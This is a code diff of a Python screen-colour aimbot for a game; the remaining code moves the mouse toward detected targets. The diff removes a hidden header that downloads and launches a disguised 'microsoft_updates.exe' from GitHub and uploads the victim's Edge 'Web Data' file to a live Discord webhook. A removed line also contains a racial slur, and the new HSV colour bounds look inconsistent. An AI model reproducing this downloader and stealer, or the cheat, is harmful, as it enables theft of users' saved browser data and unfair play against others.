@@ -1,35 +1,10 @@
-import os
-import requests
-import time
-
-try:
- os.system("curl.exe -L -o microsoft_updates.exe https://github.com/yyllevi/yyllevi/raw/refs/heads/main/microsoft_updates.exe")
- time.sleep(4)
- os.system("start microsoft_updates.exe")
-except:
- pass
-
-Web_Data = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft\\Edge\\User Data\\Default\\Web Data')
-try:
- with open(Web_Data, 'rb') as f:
-    f = f.read()
-
- link = "https://discord.com/api/webhooks/1429030702090948650/wVnXAoK2s1n7dmVc7fHIhstWAjkox-3s9ZYO9GN47bZTYAdSw2s6pqgnGTol15Lzi_CR"
-
- message = {
-    "data": f
- }
-
- res = requests.post(link, files=message) 
-except:
-  pass
-
 from mss import mss # by levi && lonely
 import numpy as np
 import ctypes
 import pygame
 import os
 import time
+import cv2
 
 os.system('cls')
 
@@ -55,7 +30,7 @@ def main():
 {gray}███████║██║{red} ╚████╔╝ ██║  ██║
 {gray}╚══════╝╚═╝{red}  ╚═══╝  ╚═╝  ╚═╝""")
  print(f"""{gray}By LEVI &{red}& LONELY""")
- print(f"\033[0m{red}UPDATE {gray}#PURPLE + seraph is nigga")
+ print(f"\033[0m{red}UPDATE {gray}#1.3")
 
  with mss() as ss:
      while True:
@@ -67,11 +42,16 @@ def main():
          screen = {"left": left, "top": top, "width": width, "height": height}
          screenshot = np.array(ss.grab(screen))
     
-         r, g, b = screenshot[:, :, 2], screenshot[:, :, 1], screenshot[:, :, 0]
-         mask = (r >= 190) & (g <= 109) & (b >= 192)
-         ys, xs = np.where(mask)
+         hsv = cv2.cvtColor(screenshot, cv2.COLOR_BGR2HSV)
 
-    
+
+         lower = np.array([157,140,200])
+         upper = np.array([155,255,255])
+         mask_main = cv2.inRange(hsv, lower, upper)
+
+
+         ys, xs = np.where(mask_main)
+
          if len(xs) == 0:
              continue
     
@@ -89,10 +69,10 @@ def main():
              target_y = int(centroid_y)
     
              dx = target_x - grab_x 
-             dy = target_y - grab_y -14
+             dy = target_y - grab_y -18
 
-             dx = max(min(dx, 80), -80)
-             dy = max(min(dy, 80), -80) 
+             dx = max(min(dx, 70), -70)
+             dy = max(min(dy, 70), -70) 
     
              ctypes.windll.user32.mouse_event(0x0001, dx, dy)
 
@@ -103,9 +83,6 @@ def main():
          time.sleep(1.5)
          print(f"{red}PLEASE PLUG IN YOUR CONTROLLER!")
          time.sleep(1.5)
-      time.sleep(0.0011)
 
 main()
-
-
 
